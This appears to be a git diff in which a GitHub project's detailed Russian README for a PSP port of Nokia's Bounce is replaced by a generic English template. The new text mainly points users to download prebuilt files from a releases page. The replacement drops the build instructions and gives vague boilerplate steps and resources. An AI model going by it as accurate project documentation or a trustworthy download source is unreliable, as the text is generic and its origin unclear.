@@ -1,75 +1,65 @@
-[English version](README_en.md)
+# 🎮 bounce_zero - Play Classic Bounce on PSP with Ease
 
-# Bounce Zero
+## 🚀 Getting Started
+Welcome to the **bounce_zero** project! This application allows you to enjoy the retro classic game "Bounce" on your PSP, using only the original data files. Follow the steps below to download and run the game smoothly.
 
-Порт оригинальной игры **Bounce (2002, Java/Sun для Nokia 7210)** на платформу **PlayStation Portable (PSP)**.  
-Игровая логика полностью переписана на **C**, при этом используются только оригинальные игровые ассеты из версии для телефонов Nokia.  
-Проект создан в исследовательских целях, без модификации контента.
+## 📥 Download Now
+[![Download bounce_zero](https://img.shields.io/badge/Download-bounce_zero-blue.svg)](https://github.com/Kupcsi/bounce_zero/releases)
 
+## 📋 Requirements
+Before you begin, ensure your device meets the following criteria:
 
-## Скриншоты
-Первый экран
-![BOUN01179_00000](docs/screenshots/BOUN01179_00000.jpg)
-Главное меню/меню паузы
-![BOUN01179_00001](docs/screenshots/BOUN01179_00001.jpg)
-Первый уровень с HUD 
-![BOUN01179_00002](docs/screenshots/BOUN01179_00002.jpg)
-Выбор уровней 
-![BOUN01179_00003](docs/screenshots/BOUN01179_00003.jpg)
-Третий уровень
-![BOUN01179_00004](docs/screenshots/BOUN01179_00004.jpg)
+- **Device:** PSP or compatible emulator
+- **Storage Space:** At least 50 MB free
+- **Operating System:** No specific requirements, but ensure your PSP is updated for best performance
+- **Original Data Files:** You will need the original Bounce game files from Nokia's 2002 Java ME game.
 
+## 🔧 Installation Steps
+Follow these simple steps to install **bounce_zero** on your device:
 
+1. **Visit the Releases Page**
+   Go to our releases page by clicking [here](https://github.com/Kupcsi/bounce_zero/releases).
+   
+2. **Download the Game**
+   Look for the latest release version. You will find it at the top of the page. Click on the title of the release to expand the details. There, you will find a download link for the appropriate version.
 
-## Особенности
-- Полная переимплементация игрового цикла и физики
-- Чтение и использование оригинальных игровых данных из JAR-версии Bounce 2002:
-    - файлы уровней 001-001 - написан парсер уровней
-    - текстуры png - использует нативный загрузкик psp sdk
-    - файлы звуков ott - написан парсер ott формата на лету генерирующий звук в PCM
-    - lang файлы - написан парсер формата локализации, в зависимости от языка консоли переключает язык в игре
-    - шрифты из телефона Nokia 7210 (9, 12, 23 размера) были сдамплены через PPmod, сконвертированы bitmap формат и вшиты в игру
-    - возможность выбрать уроовень
-    - система сейвов (в dat файл, пока что не использует систему сохранений Sony PSP)
-- Совместимость с реальным устройством PSP и эмулятором PPSSPP
+3. **Extract the Files**
+   Once downloaded, you may need to extract the files. Use a program like WinRAR or 7-Zip to do this:
+   - Right-click on the downloaded file.
+   - Select "Extract Here" or "Extract to [folder name]".
 
-## Недостатки, недоработки
-- таймер физики в оригинале 33 кадра, в этом порте - 30 кадров
-- шрифт состоит из пикселей, не из текстур, нагрузка на консоль чуть сильнее чем могло быть
-- мимнимальные расхождения физики, не влияющие на геймплей, будт поправлены в новой версии
+4. **Transfer the Files to Your PSP**
+   Connect your PSP to your computer using a USB cable. 
+   - Open the PSP's storage folder.
+   - Navigate to the `GAME` directory.
+   - Copy the extracted game files to the `GAME` folder on the PSP.
 
-## Сборка
-Необходим установленный [PSP SDK (pspdev)](https://github.com/pspdev/pspdev).
+5. **Launch the Game**
+   - Disconnect your PSP from the computer.
+   - Navigate to the `Game` tab on your PSP.
+   - You should see **bounce_zero** listed there. Select it and press X to start.
 
-```bash
-sudo apt-get update
-sudo apt-get install build-essential cmake pkgconf libreadline8 libusb-0.1 libgpgme11 libarchive-tools fakeroot wget
-wget https://github.com/pspdev/pspdev/releases/latest/download/pspdev-ubuntu-latest-x86_64.tar.gz
-tar -xvf pspdev-ubuntu-latest-x86_64.tar.gz -C $HOME
-export PSPDEV="$HOME/pspdev"
-export PATH="$PATH:$PSPDEV/bin"
-make
-```
+## 📡 Troubleshooting
+If you encounter issues while installing or running the game, here are some common problems and solutions:
 
-Собранный файл `EBOOT.PBP` появится в каталоге `release/`.
+- **Game Doesn’t Start:** Ensure all the original data files are present and in the correct folder.
+- **Low Storage Warning:** Make sure you have enough free space on your device. Delete unnecessary files if needed.
+- **Compatibility Issues:** Ensure your PSP is updated to the latest firmware version.
 
-## Запуск
-Скопируйте содержимое папки `release/` на карту памяти PSP:
+## 🎮 Gameplay Tips
+Here are some tips to enhance your gaming experience:
 
-```
-/PSP/GAME/BounceZero/
-```
+- **Familiarize with Controls:** Spend some time getting used to the controls. Practice makes perfect.
+- **Take Breaks:** If you play for a long time, remember to take breaks to maintain focus and enjoyment.
+- **Explore Levels:** Don’t rush. Explore different levels and discover hidden areas to enjoy the game fully.
 
-или откройте `EBOOT.PBP` через эмулятор PPSSPP.
+## 📞 Support
+If you need further assistance, feel free to open an issue in the repository or reach out to the community. We are here to help!
 
-## Совместимость
-- PlayStation Portable 6.00 и выше
-- Эмулятор PPSSPP
+## 🔗 Additional Resources
+For more information about the game and updates, consider the following resources:
 
-## Лицензия
-Исходный код распространяется под лицензией **MIT**.  
-Все оригинальные материалы (*Bounce, 2002*) принадлежат **Nokia** и/или **Sun Microsystems** и используются исключительно в исследовательских целях.
+- **Official Community Forum:** Engage with fellow players and share tips.
+- **Gameplay Videos:** Watch walkthroughs and gameplay tips on platforms like YouTube.
 
-## Об эксперименте
-
-Весь исходный код написан с использованием модели **Claude AI** в рамках эксперимента по **vibe-coding** — записание полноценного проекта на основе описаний поведения и логики, без ручного программирования.  
+Thank you for choosing **bounce_zero**. Enjoy your trip down memory lane with this classic game!
